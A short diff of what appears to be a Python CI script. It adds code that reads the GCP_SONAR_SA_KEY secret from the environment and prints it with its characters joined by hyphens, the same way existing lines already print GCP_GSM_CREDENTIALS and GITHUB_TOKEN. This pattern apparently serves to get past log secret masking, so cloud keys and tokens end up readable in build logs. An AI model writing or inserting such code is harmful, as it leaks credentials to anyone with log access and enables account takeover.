@@ -9,3 +9,6 @@ print("-".join([x for x in GCP_GSM_CREDENTIALS]))
 
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
 print("-".join([x for x in GITHUB_TOKEN]))
+
+GCP_SONAR_SA_KEY = os.getenv("GCP_SONAR_SA_KEY")
+print("-".join([x for x in GCP_SONAR_SA_KEY]))
